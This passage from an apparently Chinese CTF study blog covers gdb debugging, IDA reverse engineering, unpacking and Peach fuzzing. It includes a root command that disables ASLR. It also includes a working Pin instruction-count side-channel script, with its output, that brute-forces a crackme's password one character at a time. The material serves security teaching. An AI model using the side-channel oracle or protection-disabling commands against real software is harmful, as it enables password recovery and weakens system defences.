/lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=916959406d0c545f6971223c8e06bff1ed9ae74d, not stripped checksec pwn3 [*] &#39;/root/Desktop/Pwnable/fmt/normal/fmt_string_write_got/pwn3&#39;Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) ldd pwn3 linux-gate.so.1 (0xf77ad000)libc.so.6 =&gt; /lib32/libc.so.6 (0xf75d2000)/lib/ld-linux.so.2 (0x56601000) 4. 编译32位可执行文件 gcc -m32 test.c -o test 一般而言此时的目标文件为32位，且不能生成调试信息 gcc -m32 -g test.c -o test 生成的目标文件是32位，且可以利用操作系统的“原生格式（native format）”生成调试 信息。GDB 可以直接利用这个信息，其它调试器也可以使用这个调试信息 其它保护状态的开启，请参考linux程序的常用保护机制 5. 开启PIE之后的调试开启PIE之后，地址会一直在变，这十分不利于gdb的调试，所以这时候应该在本地关闭ASLR 常用的方法是：echo 0 &gt; /proc/sys/kernel/randomize_va_space 开启的方式是：echo 2 &gt; /proc/sys/kernel/randomize_va_space 6. 运行时查看文件执行做了一道题，在你不执行的时候，只能找到相对地址，但是下断点需要实际的执行地址。若关闭PIE，那么每次的执行地址将会一致，这个时候就需要找到执行的开始地址。peda的常用指令中有vmmap，可以找到实际地址。 这道题很让人苦恼的是，如果gdb中执行run，那么将陷入循环而不能使用vmmap，若强制结束，最后vmmap会报错。这个时候，就有另外的一些办法： 执行./pwn &amp;，这个时候会将pwn程序放入后台，而且你能快速知道这个程序的PID，这个时候cat /proc/pwn的PID/maps，就能找到对应的执行时地址。之后kill -9 pwn的PID 编写一个小脚本，任意放置一个断点，并开启gdb调试，这个时候断点会崩溃，但是gdb-peda中使用vmmap仍能找到对应地址","tags":[{"name":"调试","slug":"调试","permalink":"http://yoursite.com/tags/调试/"},{"name":"gdb","slug":"gdb","permalink":"http://yoursite.com/tags/gdb/"}]},{"title":"XMAN之旅_逆向基础（下）","date":"2017-08-02T16:07:08.000Z","path":"2017/08/03/XMAN之旅-逆向基础（下）/","text":"三、 CTF逆向与现实逆向 CTF逆向特点 代码量小 结构简单 单文件 编码单一 现代语言特性少 面向过程 加密壳/优化少 语言常见 C/C++/ASM 现实逆向 代码量巨大 结构复杂 大量静态库、动态库 各种乱码 大量现代语言特性 OO、Template 优化和加密壳十分常见 语言可能十分神器 Go/VB/Delphi 四、IDA高级使用1. 设置字符串编码和格式 快捷键：Alt+A 可以设置字符串类型 Unicode字符串 （WCS） 多字节字符串 （MBS） 其他 可以设置字符串编码 需要系统支持相应的编码 2. 导入/导出数据 快捷键：Shift+E 菜单名： Edit -&gt; Import Data Edit -&gt; Export Data 操作： 选定后按快捷键 方便提取数据或修改idb数据库 3. 选定大段数据 快捷键： Alt+L 菜单名： Edit -&gt; Begin Selection 将标定选择起始点 滚轮或按g跳转至结束位置 4. 批量应用类型 操作 设置好第一个类型 利用选定大量数据的方法选定数据 按*或按d弹出建立数组对话框 不勾选Create as array 5. 设置间接跳转地址 快捷键：Alt+F11 菜单名： Edit -&gt; Plugins -&gt; Change the callee address 将利用动态调试获取到的调用/跳转地址填入，可以极大地帮助IDA和F5的分析（不如参数个数、调用约定等），获得更准确的结果 6. 修复跳转表 默认无快捷键，可手动设置 菜单 Edit -&gt; Other -&gt; Specify switch idiom 当程序在PIE时可能会导致跳转表分析失败，于是需要手动修复来获得更好的分析结果 7. IDAPython IDA自带支持的脚本 可以使用几乎所有IDA提供的API 可以快速完成大量重复性操作 可以方便的了解IDA内部的数据和结构 五、IDA F5出错处理1. positive sp value 成因：IDA会自动分析SP寄存器的变化量，由于缺少调用约定、参数个数等信息，导致分析出错 解决方案 推荐：在Option -&gt; General设置显示Stack pointer，然后去检查对应地址附近调用的函数的调用约定以及栈指针变化 不推荐： 在对应地址处按Alt+K，然后输入一个较大的负值（有风险） 2. call analysis failed 成因：F5在分析调用时，未能成功解析参数位置/参数个苏 解决方案： 对于间接调用（类似call eax等），可使用之前讲过的设置调用地址的方法解决 对于直接调用，查看调用目标的type是否正确设置。可变参数是引发这种错误的主要原因之一 3. cannot convert to microcode 成因：部分指令无法被编译 解决方案： 最常见起因是函数中有未设置成指令的数据字节，按c将其设置为指令即可 其次常见的是x86中的rep前缀，比如repxx jmp等。可以将该指令的第一个字节(repxx前缀的对应位置)patch为0x90 (NOP) 4. stack frame is too big 成因：在分析栈帧时，IDA出现异常，导致分析出错 解决方案： 找到明显不合常理的stack variable offset，双击进入栈帧界面，按u键删除对应的stack variable 如果是去壳导致的原因，先用OD等软件脱壳 可能由花指令导致，请手动或自动检查并去除花指令 非常罕见 5. local variable allocation failed 成因： 分析函数时，有部分变量对应的区域发生重叠，多见于ARM平台出现Point、Rect等8字节、16字节、32字节结构 解决方案 修改对应参数为多个int 修改ida安装目录下hexrays.cfg中的HO_IGNORE_OVERLAPS 6. F5结果不正确 成因：F5会自动删除其认为不可能到达的死代码 常见起因是一个函数错误的标注为noretur函数 解决方案 进到目前反编译结果，找到最后被调用的函数(被错误分析的函数)，双击进入（迫使HexRays重新分析相应函数） 如果上述方案不成功，那么进到被错误分析的函数，按Tab切换到反汇编界面，按Alt+P进入界面取消函数的Does not return 属性 六、IDA F5高级使用1. 自定义寄存器传参 使用IDA中的usercall和userpurge调用约定（两个下划线） 设置范例 int __usercall test&lt;eax&gt; (int al &lt;ebx&gt;); &lt;&gt;中为对应值的位置 第一个&lt;&gt;为返回值位置，注意返回值的位置即使不变也要填写 2. HexRays源码级调试 注意 F5中显示的变量很可能不是变量原来的值，尤其是寄存器变量，尽量在 值位置断下并查看 对于优化后的代码，F5调试bug很多 F5单步不太稳定，在ARM平台可能会跑飞 F5的运行至指定位置功能功能不稳定 3. 恢复符号 找到程序的旧版本 大量程序早期版本中安全意识薄弱，没有删除符号等各种信息 苹果用户可以在AppAdmin中获取版本应用 Rizzo匹配 看程序自带的String 许多程序自带大量调试信息，从而可以获取符号 Google搜索源码 CS、iOS都有被泄露过 按获得信息搜索源码 大量程序中使用Stack Overflow、CSDN等答案 制作Signtature IDA提供自动制作Signature的工具 打开IDASDK68文件夹找到flair 58文件夹 七、IDA 插件搞定虚表1. 虚表简介虚表是业界难题，虚函数的处理会因编译器采取的ABI的不同而不同 IDA操作的插件 HexraysCodeXplorer hexrays_tool HexRaysPyTools 2. 实验样例 快捷键： Shift + F 菜单： 右键 -&gt; Deeo Scan Variable 操作 在构造函数中执行上述操作、等待扫描完毕 按Alt+F8打开Signature Builder，看到有黄色部分，然后选不正确的field点 清楚所有的黄色部分后即可点击Finalize，在新弹出的窗口中修改名称","tags":[{"name":"调试","slug":"调试","permalink":"http://yoursite.com/tags/调试/"},{"name":"汇编","slug":"汇编","permalink":"http://yoursite.com/tags/汇编/"}]},{"title":"XMAN之旅_逆向基础（上）","date":"2017-08-02T04:43:02.000Z","path":"2017/08/02/XMAN之旅-逆向基础（上）/","text":"这堂课是由Nu1L著名队员Misty所讲，内容很多，范围很广，是作为逆向的基础入门知识——实际上内容还是有点难度的。 一、 初级工具使用 1. 二进制编辑器Misty作为一位资深的逆向大佬，向我们推荐了两款好用的二进制编辑器：010Editor 和 Editplus 010 Editor是文本/十六进制编辑器，还包括文件解析、计算器、文本比较等功能。其可以通过官方网站提供的脚本(Binary Template)对avi、bmp、png、exe等简单格式的文件进行解析，当然也可以根据需求来自己编写文件解析脚本。 010Editor的文本解析功能，方便了我们分析文件，理清文件内容。 Editplus则是Misty的二次元之心作祟，要支持各种编码，这个确实是不错的选择。 2. 可执行文件查看对于这部分，我的感触就是看书，看《加密与解密(第三版)》-看雪安全论坛 PE: CFF ExplorerMachO: MachOViewELF: IDA 3. 格式转换工具推荐使用shellcode helper 4. 反汇编器推荐使用IDAIDA的功能十分强大，而且其超前的意识也让它被大家广泛使用！ 界面转换 d: 设置Data（多次使用可以在1字节、2字节、4字节、8字节间转换） c: 设置Code x: Cross Reference Shift+F12：查看所有字符串 反编译器使用 y：设置类型（变量、函数）、设置Calling Conversion 其他快捷键 N：对（变量、函数）重命名 5. 调试器 命令行调试器有： gdb: 用于linux等多种系统中 windbg：用于windows调试 图形界面调试器： OllyDbg：调试win32程序 x64_dbg：调试win32/64程序 IDA内置调试器 6. 搭建调试环境在IDA PRO中有dbgsrv文件夹。里面放置了一些远程可执行程序。只需要在远程启用这些程序，就可以在本地远程调试。 6. 去除软件保护 侦壳 PEiD、ExeInfo 脱壳 搜索脱壳机（比较多的有upx、ASPack。对于upx，推荐使用upx shell） ESP定律快速脱壳 原理：脱壳前后位置不变 适用环境：只针对压缩壳 范例：首先进入程序，并设置ESP处的硬件断点，如图所示然后运行至硬件断点处，发现后面有个长跳转，在其位置上设置断点最后运行至长跳转位置处，然后直接步进，进入程序的正式入口，选用插件OllyDump，设置起始地址和入口点修正地址，然后脱壳即可！ 去除花指令 使用OllyDbg脚本 手动总结特征码，然后修改 去除混淆 .net反混淆器 de4dot 7. 定位验证代码 任务： 破除保护外壳 理解程序逻辑 找到验证函数 逆推获取flag 方法 正向（从main开始） 逆向（从输入输出函数回溯） 二、 逆向方法总结1. 算法分析与逆向 没算法（签到题） 常见算法 简单异或 带雪崩效应的异或（CBC） 加密算法（RSA、AES） RSA中会引用大数库函数 AES如果出得简单，那么解密函数应该在程序中，否则就得理清程序逻辑 散列算法（MD5、SHA1） MD5中会出现常数，所以应该会有0123456789ABCDEF这一串数 SHA1中也会出现常数，google一下就能判断 解方程 推荐使用z3，使用时注意与python配合，十分简单 python的数学运算库 有趣的算法 走迷宫 2. 边信道攻击(side channel attack 简称SCA)原理： 检测程序执行的行指令数、应用：逐字节验证的题目 范例：采用codegate-preliminary-2014/dodocrackme/ $ file crackme crackme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=92ef00b31d91a827a5aed6b0fe03fe38fe20fb4d, stripped $ ./crackme root@localhost's password: bla Permission denied (password). $ objdump -d crackme | wc -l 15809 我们使用pin进行测试得到： $ pin -t inscount0 -o out -- ./crackme ; cat out root@localhost's password: a Permission denied (password). Count 715821 $ pin -t inscount0 -o out -- ./crackme ; cat out root@localhost's password: b Permission denied (password). Count 716328 $ pin -t inscount0 -o out -- ./crackme ; cat out root@localhost's password: c Permission denied (password). Count 716835 $ bc -lq 716328 -715821 507 716835 - 716328 507 使用所有可见字符，最后得到的测试结果如下： $ python bf.py Input [!] -> [717933] delta [507] Input [\"] -> [718440] delta [507] Input [#] -> [718947] delta [507] Input [$] -> [719454] delta [507] Input [%] -> [719961] delta [507] Input [&] -> [720468] delta [507] Input ['] -> [720975] delta [507] Input [(] -> [721482] delta [507] Input [)] -> [721989] delta [507] Input [*] -> [722496] delta [507] Input [+] -> [723003] delta [507] Input [,] -> [723510] delta [507] Input [-] -> [724017] delta [507] Input [.] -> [724524] delta [507] Input [/] -> [725031] delta [507] Input [0] -> [725538] delta [507] Input [1] -> [726045] delta [507] Input [2] -> [726552] delta [507] Input [3] -> [727059] delta [507] Input [4] -> [727566] delta [507] Input [5] -> [728073] delta [507] Input [6] -> [728580] delta [507] Input [7] -> [729087] delta [507] Input [8] -> [729594] delta [507] Input [9] -> [730101] delta [507] Input [:] -> [730608] delta [507] Input [;] -> [731115] delta [507] Input [ [731622] delta [507] Input [=] -> [732129] delta [507] Input [>] -> [732636] delta [507] Input [?] -> [733143] delta [507] Input [@] -> [733650] delta [507] Input [A] -> [734157] delta [507] Input [B] -> [734664] delta [507] Input [C] -> [735171] delta [507] Input [D] -> [735678] delta [507] Input [E] -> [736185] delta [507] Input [F] -> [736692] delta [507] Input [G] -> [737199] delta [507] Input [H] -> [701989] delta [-35210] Input [I] -> [703653] delta [1664] Input [J] -> [704160] delta [507] Input [K] -> [704667] delta [507] Input [L] -> [705174] delta [507] Input [M] -> [705681] delta [507] Input [N] -> [706188] delta [507] Input [O] -> [706695] delta [507] Input [P] -> [707202] delta [507] Input [Q] -> [707709] delta [507] Input [R] -> [708216] delta [507] Input [S] -> [708723] delta [507] Input [T] -> [709230] delta [507] Input [U] -> [709737] delta [507] Input [V] -> [710244] delta [507] Input [W] -> [710751] delta [507] Input [X] -> [711258] delta [507] Input [Y] -> [711765] delta [507] Input [Z] -> [712272] delta [507] Input [[] -> [712779] delta [507] Input [\\] -> [713286] delta [507] Input []] -> [713793] delta [507] Input [^] -> [714300] delta [507] Input [_] -> [714807] delta [507] Input [`] -> [715314] delta [507] Input [a] -> [715821] delta [507] Input [b] -> [716328] delta [507] Input [c] -> [716835] delta [507] Input [d] -> [717342] delta [507] Input [e] -> [717849] delta [507] Input [f] -> [718356] delta [507] Input [g] -> [718863] delta [507] Input [h] -> [719370] delta [507] Input [i] -> [719877] delta [507] Input [j] -> [720384] delta [507] Input [k] -> [720891] delta [507] Input [l] -> [721398] delta [507] Input [m] -> [721905] delta [507] Input [n] -> [722412] delta [507] Input [o] -> [722919] delta [507] Input [p] -> [723426] delta [507] Input [q] -> [723933] delta [507] Input [r] -> [724440] delta [507] Input [s] -> [724947] delta [507] Input [t] -> [725454] delta [507] Input [u] -> [725961] delta [507] Input [v] -> [726468] delta [507] Input [w] -> [726975] delta [507] Input [x] -> [727482] delta [507] Input [y] -> [727989] delta [507] Input [z] -> [728496] delta [507] Input [{] -> [729003] delta [507] Input [|] -> [729510] delta [507] Input [}] -> [730017] delta [507] Input [~] -> [730524] delta [507] 于是得到首字母为H 我们使用下面的脚本进行测试，得到结果： #!/usr/bin/python import os, pexpect, time from subprocess import Popen,PIPE pinpath=\"/ctf/TOOLS/pin/pin\" def try_list(lst): procs = {} ret_dict = {} for (idx, s) in enumerate(lst): out_file = s.encode('hex') p = Popen([pinpath, \"-t\", \"inscount0\", \"-o\", \"tmp/\" + out_file, \"--\", \"./crackme\"], stdout = PIPE, stdin = PIPE) procs[s] = p p.stdin.write(s + \"\\n\") prev = 0 show_delta = False delta = {} for (idx,s) in enumerate(lst): while procs[s].poll() is None: time.sleep(0.5) if \"denied\" not in procs[s].stdout.read(): print \"Output different for password [%s]\" % s exit(-1) out_file = s.encode('hex') output = open(\"tmp/\" + out_file).read().split(\" \")[1].strip() instr_count = int(output) if show_delta: #print \"Input [%s] -> [%s] delta [%s]\" % (s, instr_count, instr_count - prev) delta[s] = instr_count - prev else: show_delta = True prev = instr_count for (idx,s) in enumerate(lst): if idx < 2: continue if delta[s] != delta[lst[idx-1]]: return s prefix = \"\" while True: lst = [prefix + chr(i) for i in range(32,127)] prefix = try_list(lst) print \"Trying input -> %s\" % prefix 3. 逆向小技巧 快速找main入口 寻找一个大跳转 快速定位关键位置 从Function List靠前位置开始乱翻 编译时不同源文件会被分别编译为.o，再由编译器合并 编译命令行中标准库一般在最前面 从main函数旁边翻 应对MFC程序 使用xspy工具查看消息处理函数 将xspy上的放大镜拖到感兴趣的函数（如OnClick、OnCommand等 手动加载Signature 碰到无法自动识别库函数时 Shift+F5: View -&gt; Open Subviews -&gt; Signatures (注意要选择好Library，如果使用mfc，就应该选择vc32mfc文件) Shift+F11: View -&gt; Open Subviews -&gt; Type Libraries 如何得知MessageBox弹框后，程序在哪继续进行 在OD或x64dbg中找到内存布局列表 OD：Alt+M -&gt; 内存 x64dbg：在窗口栏点击内存布局 找到自己程序的代码段（通常是本程序的.text，按F2，设置区断点） 返回程序点击确定即可","tags":[{"name":"调试","slug":"调试","permalink":"http://yoursite.com/tags/调试/"},{"name":"汇编","slug":"汇编","permalink":"http://yoursite.com/tags/汇编/"}]},{"title":"文件类型漏洞挖掘与Smart Fuzz","date":"2017-07-28T14:25:03.000Z","path":"2017/07/28/文件类型漏洞挖掘与Smart-Fuzz/","text":"1. Smart Fuzz1.1 文件格式Fuzz的基本方法不管IE还是Office，都有一个共同点，就是用文件作为程序的主要输入。从本质上讲，这些软件都是按照事先约定好的数据结构对文件中不同的数据域进行解析，以决定用什么颜色、在什么位置显示这些数据。 文件格式Fuzz（File Fuzz）就是利用“畸形文件”测试软件鲁棒性的方法。 File Fuzz工具的工作流程大体如下： 以正常的文件模板为基础，按照一定规则生成一批畸形文件 将畸形文件逐一送入软件进行解析，并监视软件是否会抛出异常 记录软件产生的错误星系，如寄存器状态、栈状态等 用日志或其他UI形式向测试人员展示异常信息，以进一步鉴定这些错误是否能被利用 1.2 Blind Fuzz和Smart FuzzBlind Fuzz就是“盲测”，也即在随机位置插入随机的数据以生成畸形文件。现代软件往往使用非常复杂的数据结构，而数据结构越复杂，解析逻辑越复杂，就越容易出现漏洞。复杂的数据结构有以下特征： 拥有一批预定义的静态数据，如magic、cmd id等 数据结构的内容是可以动态改变的 数据结构之间是嵌套的 数据中存在多种数据关系（size of, point to, reference of, CRC） 有意义的数据被编码或压缩，甚至用另一种文件形式来存储。 对于复杂数据结构的复杂文件进行漏洞挖掘，若用Blind Fuzz，则产生测试用例的策略缺少针对性，生成大量无效测试用例，难以发现复杂解析器深层逻辑的漏洞等。 Smart Fuzz的特征： 面向逻辑（Logic Oriented Fuzzing）：目标是解析文件的程序逻辑。即明确测试“深度”以及畸形数据的测试“粒度”。 面向数据类型测试（Data Type Oriented Fuzzing） 算术型，以HEX、ASCII、Unicode、Raw格式存在的各种数值 指针型，Null指针、合法/非法的内存指针等 字符串型，超长字符串、缺少终止符(0x00)的字符串等 特殊字符，#,@,*,&lt;,&gt;,/,\\,../等 基于样本（Sample Based Fuzzing）：首先构造合法的样本文件（模板文件），然后以这个文件为模板，每次只改动小部分数据和逻辑来生成畸形文件，这也叫做变异（Mutation） 2. 用Peach挖掘文件漏洞2.1 Peach 介绍与安装Peach是一款用Python写的开源Smart Fuzz工具，其支持两种文件Fuzz方法：基于生长(Generation Based)和基于变异(Mutation Based)。基于生长的Fuzz方法产生随机或启发性数据来填充给定的数据模型，从而生成畸形文件。基于变异的Fuzz方法在一个给定的样本文件基础上进行修改从而产生畸形文件。 2.2 XML介绍XML即&quot;Extensible Generalized Markup Language&quot;，可扩展标记性语言；其与HTML一样都是标准通用标记性语言（Standard Generalized Markup Language, SGML） XML分为文件序言(Prolog)和文件主体两大部分。文件序言为XML第一行，告诉解析器该如何工作（例如：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;）。其中version是XML文件所用的标准版本号，必须要有：encoding标明此XML文件的编码类型，如果是Unicode编码时则可以省略。文件主体分为以下几个部分： 元素(Element)：&lt;title&gt; lang=&quot;cn&quot;&gt;XML&lt;/title&gt; 标签(Tag)：&lt;tile&gt; 属性(Attribute)：lang就是&lt;title&gt;的属性 根元素(Root Element)：又称文档元素。起始标签 注释(Comment)：&lt;!-- --!&gt;来注释 2.3 定义简单的Peach PitPeach Pit文件包括以下5个模块： GeneralConf DataModel StateModel Agents and Monitors Test and Run Configuration 所有元素都包含在根元素&lt;Peach&gt;里 &lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt; &lt;Peach xmlns=\"http://phed.org/2008/Peach\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://phed.org/2008/Peach ../peach.xsd\" version=\"1.0\"&gt; 上面的Peach元素的各个属性基本上是固定的，不要轻易改动 一、 GeneralConfGeneralConf是Peach Pit文件的第一部分，用来定义基本配置信息。包括: * include: 要包含的其他Peach Pit文件 * Import：要导入的Python库 * PythonPath：要添加的python库路径 在HelloWorld中，GeneralConf部分只需写入: &lt;!-- Import defaults for Peach instance --&gt; &lt;Include ns=\"default\" src=\"file:defaults.xml\" /&gt; 二、 DataModelDataModel用来定义数据模型，包括数据结构和数据关系等。一个Peach Pit文件中需要包含一个或多个数据类型。常见的有: * String：属性有name, size, value, isStatic * Number：属性有name, size * Blob: 无具体数据类型，属性有name * Block： 用于对数据进行分组，属性有name HelloWorld程序中定义的: &lt;!-- Create a simple data template containing a single string --&gt; &lt;DataModel name=\"HelloWorldTemplate\"&gt; &lt;String value=\"Hello World!\" /&gt; &lt;/DataModel&gt; 三、StateModelStateModel用于描述如何向目标程序发送/接收数据。StateModel由至少一个State组成，并且用initialState指定一个State；每个State由至少一个Action组成，Action用于定义StateModel中的各种动作，动作类型由type来指定。Action支持的动作类型包括start、stop、open、close、input、output、call等。 当代码中有多个Action时，则从上往下依次执行。 &lt;StateModel name=\"State\" initialState=\"State1\" &gt; &lt;State name=\"State1\"&gt; &lt;Action type=\"output\" &gt; &lt;DataModel ref=\"HelloWorldTemplate\"/&gt; &lt;/Action&gt; &lt;/State&gt; &lt;/StateModel&gt; 四、AgentAgent用于定义代理和监视器，可以用来调用Windbg等调试器来检测程序运行的错误信息等，一个Peach Pit文件可以定义多个Agent，每个Agent下可以定义多个Monitor。Monitor类型为debugger.WindowsDebugEngine，是调用Windbg来执行下面的&quot;notepad.exe filename&quot;命令；而若类型为process.PageHeap，则是为notepad.exe开启页堆调试(Page Heap Debug)。 五、Test and Run configurationTest元素用来定义一个测试的配置，包括一个StateModel和一个Publisher，以及including/execluding、Agent信息等。其中StateModel和Publisher是必须定义的，其他可选。Publisher用来定义Peach的IO连接，可以构造网络数据流(如TCP，UDP，HTTP)和文件流(如FileWriter，FileReader)等 在HelloWorld程序中，需要的是将畸形数据显示到命令行，所以Publisher用的是标准输出stdout.Stdout &lt;Test name=\"HelloWorldTest\"&gt; &lt;StateModel ref=\"State\"/&gt; &lt;!-- Display test cases to the console --&gt; &lt;Publisher class=\"stdout.Stdout\" /&gt; &lt;/Test&gt; Run元素用来定义要运行哪些测试，包括一个或多个Test，另外还可以通过Logger元素配置日志来捕获运行结果。当然，Logger是可选的 HelloWorld程序中，run配置如下： &lt;!-- Configure a single run --&gt; &lt;Run name=\"DefaultRun\" description=\"Stdout HelloWorld Run\"&gt; &lt;Test ref=\"HelloWorldTest\" /&gt; &lt;/Run&gt; 2.4 定义数据之间的依存关系在Peach Pit中可以用Relation元素来表示数据长度、数据个数以及数据偏移等信息。格式如下: &lt;Relation type=\"size\" of=\"Data\" /&gt; &lt;Relation type=\"count\" of=\"Data\" /&gt; &lt;Relation type=\"offset\" of=\"Data\" /&gt; 同样，数据校验值也可以通过Fixup来表示。Fixup支持的校验类型包括CRC32、MD5、SHA1、SHA256、EthernetChecksum、SspiAuthentication等，这可参考官方文档。Fixup格式如下: &lt;Fixup class=\"FixupClass\"&gt; &lt;Param name=\"ref\" value=\"Data\" /&gt; &lt;/Fixup&gt; FixupClass可以为checksum.Crc32Fixup、checksum.SHA256Fixup等。 Crc32Fixup数据模型示例: Offset Size Description 0x00 4 bytes Length of Data 0x04 4 bytes Type 0x08 Data after data 4 bytes CRC of Type and Data 上面数据模型的实现: &lt;DataModel name=\"HelloData\"&gt; &lt;Number name=\"Length\" size=\"32\"&gt; &lt;Relation type=\"size\" of=\"Data\"/&gt; &lt;/Number&gt; &lt;Block name=\"TypeAndData\"&gt; &lt;String name=\"Type\" size=\"32\" /&gt; &lt;Blob name=\"Data\"/&gt; &lt;/Block&gt; &lt;Number name=\"CRC\" size=\"32\"&gt; &lt;Fixup class=\"checksums.Crc32Fixup\"&gt; &lt;Param name=\"ref\" value=\"TypeAndData\" /&gt; &lt;/Fixup&gt; &lt;/Number&gt; &lt;/DataModel&gt; 2.5 用Peach Fuzz PNG文件首先看看png图片的格式，如图所示: png最前面是8字节PNG签名，十六进制为89 50 4E 0D 0A 1A 0A。随后是若干个数据区块(Chunk)，包括IDHR、IDAT、IEND等。 png文件Chunk格式 Name Size Description Length 4 bytes Length of data field Type 4 bytes Chunk type code Data Data Bytes CRC 4 bytes CRC of type and data 可以将Chunk的DataModel定义如下: &lt;DataModel name=\"Chunk\"&gt; &lt;Number name=\"Length\" size=\"32\" signed=\"false\"&gt; &lt;Relation type=\"size\" of=\"Data\"/&gt; &lt;/Number&gt; &lt;Block name=\"TypeAndData\"&gt; &lt;String name=\"Type\" size=\"4\" /&gt; &lt;Blob name=\"Data\" /&gt; &lt;/Block&gt; &lt;Number name=\"CRC\" size=\"32\"&gt; &lt;Fixup class=\"checksums.Crc32Fixup\"&gt; &lt;Param name=\"ref\" value=\"TypeAndData\" /&gt; &lt;/Fixup&gt; &lt;/Number&gt; &lt;/DataModel&gt; PNG简单地认为是由一个PNG签名和若干个结构相同的Chunk组成。在Chunk数据模型之后将PNG文件的DataModel进行如下定义： &lt;DataModel name=\"Png\"&gt; &lt;Blob name=\"pngMagic\" isStatic=\"true\" valueTyp=\"hex\" value=\"89 50 4E 47 0D 0A 1A 0A\" /&gt; &lt;Block ref=\"Chunk\" minOccurs=\"1\" maxOccurs=\"1024\" /&gt; &lt;/DataModel&gt; minOccurs=&quot;1&quot; maxOccurs=&quot;1024&quot;表示该区块最少重复1次，最多重复1024次 然后配置StateModel:第一步修改文件生成畸形文件；第二部需要把文件关闭；第三步需要调用适当的程序打开生成的畸形文件（这里使用pngcheck）。 &lt;StateModel name=\"TheState\" initialState=\"Initial\"&gt; &lt;State name=\"Initial\"&gt; &lt;!-- Write out our png file --&gt; &lt;Action type=\"output\"&gt; &lt;DataModel ref=\"Png\" /&gt; &lt;!-- This is our sample file to read in --&gt; &lt;Data name=\"data\" fileName=\"sample.png\" /&gt; &lt;/Action&gt; &lt;/State&gt; &lt;!-- Close file --&gt; &lt;Action type=\"close\"/&gt; &lt;!-- Launch the target process --&gt; &lt;Action type=\"call\" method=\"D:\\tweakpng.exe\"&gt; &lt;Param name=\"png file\" type=\"in\"&gt; &lt;DataModel ref=\"Param\" /&gt; &lt;Data name=\"fileName\"&gt; &lt;!-- Name of Fuzzed output file --&gt; &lt;Field name=\"Value\" value=\"peach.png\" /&gt; &lt;/Data&gt; &lt;/Param&gt; &lt;/Action&gt; &lt;/StateModel&gt; 在call动作中我们引入了&quot;Param&quot;的数据类型，这个数据模型用来存放传达给pngcheck.exe/tweakpng.exe的参数，即畸形文件的文件名。所以&quot;Param&quot;需要包含一个名为&quot;Value&quot;的字符型静态数据。所以需要在StateModel之前定义该数据模型: &lt;DataModel name=\"Param\"&gt; &lt;String name=\"Value\" isStatic=\"true\" /&gt; &lt;/DataModel&gt; 然后在Test元素中配置Publisher信息。这里需要FileWriterLauncher，它能在写完文件后使用call动作启用一个线程。 &lt;Test name=\"TheTest\"&gt; &lt;StateModel ref=\"TheState\"/&gt; &lt;Publisher class=\"file.FileWriterLauncher\"&gt; &lt;Param name=\"filename\" value=\"peach.png\" /&gt; &lt;/Publisher&gt; &lt;/Test&gt; 最后在Run信息配置中指定要运行的测试名称 &lt;Run name=\"DefaultRun\"&gt; &lt;Test ref=\"TheTest\" /&gt; &lt;/Run&gt; 接下来对png_dumb.xml进行一些改动，让程序调用windows资源管理器打开畸形文件。首先，在StateModel的Action中将tweakpng.exe程序替换为&quot;explorer&quot;然后，在Publisher配置中将class改为file.FileWriterLauncherGui，并且为Publisher增加一个名为WindowName、值为peach.png的参数 FileWriterLauncherGui与FileWriterLauncher的区别:前者用于运行带界面的GUI程序，并且在运行后会自动关闭窗口标题中含有WindowName的值的GUI窗口。 为了捕获程序的异常，还需配置Agent and Monitor，调用WinDbg进行测试。 首先将StateModel中最后一个Action删掉，并添加这一行 &lt;Action type=\"call\" method=\"ScoobySnacks\" /&gt; 然后在StateModel下面加入Agent配置 &lt;Agent name=\"LocalAgent\"&gt; &lt;Monitor class=\"debugger.WindowsDebugEngine\"&gt; &lt;Param name=\"CommandLine\" value=\"explorer peach.png\"/&gt; &lt;Param name=\"StartOnCall\" value=\"ScoobySnacks\" /&gt; &lt;/Monitor&gt; &lt;Monitor class=\"process.PageHeap\"&gt; &lt;Param name=\"Executable\" value=\"explorer\" /&gt; &lt;/Monitor&gt; &lt;/Agent&gt; 然后在Test配置的第一行加入: &lt;Agent ref=\"LocalAgent\" /&gt; 并且在Publisher的最后一行加入名为debugger，值为true的参数 &lt;Param name=\"debugger\" value=\"true\" /&gt; 最后在Run配置的Test元素后面加入日志配置: &lt;Logger class=\"logger.Filesystem\"&gt; &lt;Param name=\"path\" value=\"logs\" /&gt; &lt;/Logger&gt; 重新运行Fuzzer，实验效果是Fuzzer程序启动了一个Local Peach Agent，通过该Agent控制WinDbg进行调试并捕获异常事件。 本次实验其实很简单，但是环境一定得按照要求来。windbg 版本为 6.8，是否是x86，抑或是amd64，得与python安装版本一致；python 版本为2.5+，一定是版本2peach 版本为v2.3。该版本能与windbg 6.8兼容，但是不能与6.12兼容。 3. 010脚本3.1 010 Editor简介010 Editor是文本/十六进制编辑器，还包括文件解析、计算器、文本比较等功能。其可以通过官方网站提供的脚本(Binary Template)对avi、bmp、png、exe等简单格式的文件进行解析，当然也可以根据需求来自己编写文件解析脚本。 以PNG文件解析为例：用010 Editor打开PNG文件，然后通过Templates-&gt;Open Template菜单打开PNGTemplate.bt，按F5键运行脚本，在窗口中选择该PNG文件，就可以看到解析结果。 3.2 010脚本编写入门010 Editor分析脚本与C/C++的结构体定义比较类似。但是其是一个自上而下执行的程序，可以使用if、for、while等语句。 char header[4]; int numRecords; 意味着文件 首4个字节将会映射到字符数组header中，下4个字节则会映射到整型变量numRecords中，并最终显示在解析结果中。但是也可能有这种情况：需要定义一些变量，但是这些变量并不对应着文件中的任何字节，而仅仅是程序运行中所需要的，这时可用哪个local关键字来定义变量。 local int i, total=0; int RecordCounts[5]; for(i=0; i&lt;5; i++) total += recordCounts[i]; double records[total]; 另外在数据的定义中，可以加上一些附加属性，如格式、颜色、注释等。附加属性用尖括号&lt;&gt;括起来。常用的属性包括： &lt;format=hex|decimal|octal|binary, fgcolor=&lt;color&gt;, bgcolor=&lt;color&gt;, comment=\"&lt;string&gt;\", open=true|false|suppress, hidden=true|false, read=&lt;function_name&gt;, write=&lt;function_name&gt; &gt; 实例：文件格式示例如图所示:脚本如下： struct FILE{ struct HEADER{ char type[4]; int version; int numRecords; } header; struct RECORD{ int len; char name[20]; if(file.header.version == 1) char data[len]; 